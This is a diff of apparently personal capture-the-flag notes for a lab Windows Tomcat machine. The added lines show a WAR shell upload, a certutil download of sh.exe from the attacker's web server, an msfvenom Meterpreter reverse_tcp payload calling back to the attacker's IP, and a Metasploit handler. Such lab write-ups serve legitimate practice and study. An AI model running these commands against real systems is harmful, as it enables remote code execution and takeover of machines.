@@ -371,9 +371,26 @@ nc -nvlp 4444
 upload shell.war Tomcat
 http://10.10.10.95:8080/shell/
 
-C:\apache-tomcat-7.0.88>
+C:\apache-tomcat-7.0.88> cd C:\Users\Administrator\Desktop\**flags**
+
+2. Get file on Windows Machine with Python web server
+python -m SimpleHTTPServer 80
+
+Firefox - My IP - http://10.10.14.29/
+
+C:\Users\Administrator\Desktop\flags
+
+certutil -urlcache -f http://10.10.14.29/sh.exe C:\Users\Administrator\Desktop\flags\sh.exe
+
+C:\Users\Administrator\Desktop\flags>sh.exe (run) 
+
+metasploit will listen
+
 whoami
 cd Users\Administrator\Desktop\flags
 
 type "2 for the price of 1.txt"
 
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.29 LPORT=5555 -f exe > sh.exe
+
+exploit(multi/handler)
